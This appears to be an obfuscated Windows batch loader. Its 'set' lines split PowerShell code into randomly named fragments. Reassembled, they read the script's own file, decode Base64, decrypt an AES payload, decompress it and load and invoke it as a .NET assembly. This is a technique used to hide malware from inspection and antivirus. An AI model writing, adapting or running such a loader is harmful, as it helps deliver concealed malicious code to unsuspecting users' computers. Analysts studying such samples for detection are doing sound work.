@echo off
set "zjPMVqdpeD=hw);"
set "WhzfpaPzZv=ptog"
set "YhJwrRpMhC=();$"
set "tmsnyuosCK=rt]:"
set "HBeZSMlEPs=$AjP"
set "ZCYMsrFIvL=ach "
set "IPqwJLuYUE=am;$"
set "DqsZaFHBCZ=ode]"
set "NSWKOMuulU='[-1"
set "cvxEKACjvr=[Sys"
set "CqUNSYvhLc=Prp "
set "DzCRIJfaUW=..-1"
set "DILQPyEXrp=rans"
set "sKUVJCpreW=and "
set "dqwXwdQcjK=oryS"
set "jQzIYyAnko=[IO."
set "jixisnPrDJ=$uxQ"
set "GXcchnAjgT=isfL"
set "AbseemHhHv=Fina"
set "nLLSWBpHLC=TZos"
set "iUHRhPGYBb=ne);"
set "ybHzAlTMlh=736u"
set "zmNjOAJyVk=Prp."
set "IuWtzVMVom=TZos"
set "JQNaPnKoOT=[Sys"
set "lXYmjNzCGi=ct S"
set "OVqMEhXsAZ=ss -"
set "JTajcrDPsM=nirt"
set "DVdCOoGRkY=ou.I"
set "GOuffVgHbr=jJ, "
set "YEjmEdKeCQ=ppLU"
set "XkyaTiSlKE=ct S"
set "fbuNIcWTwd=dyGo"
set "lZAbfbcDAE=oArr"
set "CDbuxgqKWR=.-16"
set "YyATqmKkIh=.Mem"
set "VURvpvbccU= New"
set "xSPCTuObsf=('%*'"
set "WJiKHtrOiC=)))"
set "QnqPlLDWJJ=trea"
set "MaQwGsouQq=jPou"
set "MJRVdCDeLc=th('"
set "kBmsVTpoHL='dqR"
set "GSPJHiWQEM=ress"
set "oMUMkIkaSx=ptor"
set "PebuwQYZzu=raph"
set "mWDMVuhSpQ=($GA"
set "GINfVXZXDS=.Mod"
set "cfXcunKLWj=ateD"
set "kPmLFmAJZD=Fo7l"
set "zEyNNhDLoY=pher"
set "IRensjkdxZ=se()"
set "BpdSoDEMTo=oin "
set "yXMdvNfCoc=TZos"
set "nnLBFCpdUU=AjPo"
set "DCrcqAmjkg=orF'"
set "CIWVqdVaee=KdYI"
set "cPmQBhTpoG=-4] "
set "HcYvMRywcv=u.Pa"
set "QzZQxXFCdI=[-1."
set "wnIQMdJkJr=gMod"
set "NrioqtEEGI=ewLi"
set "NXUvbtmaWN=tem."
set "avTGjfFmHn=ress"
set "peosJOWfJy=Syst"
set "MVdnIFVVzP=in $"
set "gusEKiePfU=;$Kd"
set "wJqyZwmJaY=y.Cr"
set "CAFiikGnHp=BC;$"
set "OPoHFKefgw=OyzA"
set "GEvTeRJAvv=yste"
set "DDJGSSyFgL=[Env"
set "kpIWbsfurF='txe"
set "iaWynFvDil=em.I"
set "BtuRFZwUcq=tsWi"
set "OnvHgUGrto=Mode"
set "wplKcaeobF=ew-O"
set "dVqmrGIquA=esaB"
set "vVBxRGEjVF=$aNL"
set "ymtzHcsbik=($GA"
set "AGqEQlfSBc=  $H"
set "UGJCKMgjQv=yTo("
set "BIadtzxgmH= = $"
set "GptFwbRazB=:('g"
set "quTuitXdJA=lBlo"
set "noJVlZUXYQ=y]::"
set "iKaxdTpJZC=;$Xp"
set "zsyXLsLuAn=pLU."
set "clCTVYXcQB=.Dis"
set "IOAZTkcYso=$uxQ"
set "jMyxBomXpT=New-"
set "gFOQzHnNSd=daeR"
set "vuNrdkaoSl=Comp"
set "LLLIBdRqXQ=lit("
set "lReGuBLdAA=);$A"
set "EYEitDOJEP=.Con"
set "qSBKIdovZV=6] -"
set "rFIpuxwAWg=yste"
set "yBoKtmfTat=ose("
set "ieMhYpxlYS=dyGo"
set "sJHaNspGBo=m.IO"
set "gAwJNilXjG=Invo"
set "bsNEoYzpkm=();$"
set "VImWjUBkCn=n ''"
set "RvavZynJeq===')"
set "SFnEDbylDe=stem"
set "NlTetCaiJY=.Sec"
set "BpVAejybUs=hw.T"
set "DHmBDRmlQp=jPou"
set "FHfHdamacp=stem"
set "TvLYerunEi=grap"
set "LjlmHdaPfq=tem."
set "eVeeZPobsV=TllA"
set "DfFZmOdoey=form"
set "OJqhBXzqoO=pres"
set "bZfSKWdKHn=d;$A"
set "sqNTHRQfIx=ck($"
set "GaeFhTORMK=brea"
set "HszsIQbwEZ= [st"
set "YIMPejHGvB=.Cry"
set "SPQagQznRV=Syst"
set "hTwxTNuUDr=ddin"
set "gVPfgiXCvt=vj0m"
set "kIgbLszszs=]::C"
set "FCWRIbEgMM=.Dis"
set "JjnhsIszyQ=pStr"
set "rnldxsHJAt=fore"
set "oSoxFieBCS=m(, "
set "UrmJJRVeYT= = N"
set "RwpVZjmkQS=Y, 0"
set "yrEAsEIxiv=ypto"
set "TdjnGWxijy=3); "
set "SnIBXYvQRi=sY ="
set "drreZKsHQg=bjec"
set "IlVoBAOLkx=Obje"
set "qFHTxrZiIB=$uxQ"
set "IstypeRVHI=stem"
set "OwNfnTwQRw=Comp"
set "jwEYHQmKDU=Disp"
set "RnrpqAAnDb=.Cre"
set "kXaJvRJotj=16] "
set "QZUUUxynyV=;$SV"
set "czotcGVHHM=[]] "
set "ebLJLdpybn=-nop"
set "xapjeJHmxv=Y = "
set "tSQmvLhKIF=sY);"
set "UOEbGCDoBT=e]::"
set "FjfUMlIgkE=]::("
set "PzwAvBxNUY=:: '"
set "aQAxzsVfbT=em.C"
set "zpPFrOXSyS=ress"
set "BERHmGunGi=UGTu"
set "DeiPaoSPkK=ecry"
set "WCpjYLUufI== $A"
set "LWesiMgpQG=le  "
set "rWZUVHDBpV=rity"
set "flRlpfwEqd=('da"
set "wBzkhFJaxG=ZosY"
set "ecFLtdWLMt=xQhw"
set "SRqQoesyId=ect "
set "VoyeDiJJmY=jPou"
set "nKaIlQHVrW=yste"
set "wjXCucXuEu=tryP"
set "LXsAHBFJTt=tion"
set "grggbTVXIf=iron"
set "PIbWewFbyh= = $"
set "klRZsoxgxE== [S"
set "kftJBgCkBw=.Key"
set "aVRYFzgeQX=vVf "
set "dDtZEWfAnv=mory"
set "DVvptLLhvB=('l0"
set "tDKpxeEbgk=O.Me"
set "dktnGWSpfI=ptog"
set "ZozrEswdwq=hw ="
set "JDwKIBmuMr=Bmor"
set "mscnfKRXGu=ispo"
set "nBoTTeUvfX=hy.A"
set "nRkyfpWfOu=;$SV"
set "llGBrjUaWm=m.IO"
set "opehIICzOQ=ZYYc"
set "XveUlrZQrx=rp.T"
set "ZzWGBljyDc=Qd.D"
set "SrxZTFYccD= = ["
set "uQxBkptdao=pose"
set "vPoyMMkKro=J = "
set "VPNwqVIXGS=$LlG"
set "TZsNinUUXQ=eam("
set "oOJwFHTsZW=]::N"
set "avDpqosfeB=vert"
set "AuJelRGnkr=bstr"
set "aurQmpjRYS=-joi"
set "BmSWggeHni=('%~f0'"
set "PIXNMWBtUD=vVf."
set "aUcLqNrjFZ=LlGj"
set "LLRfKnPDWT=6esa"
set "MoubVYfMJQ=null"
set "gnTFGeqfyR=ion."
set "FFpPGmghMM=gth)"
set "chvDwxFrWp=$TPO"
set "yonSdVNKMj=urit"
set "lPtKseKZgT=B) {"
set "QKLbOotrKX=y.Ci"
set "UWOFFIgfQy=Star"
set "kARxZqTqep= if "
set "UbFYForTvP=Secu"
set "dDCqmkgGFH=saBm"
set "ChFIlBULAt=Obje"
set "qyLfqSzVKx=jPou"
set "DmSeFMWRri='[-1"
set "CZoirysAbQ=3HWs"
set "JQYlCIBphQ= '')"
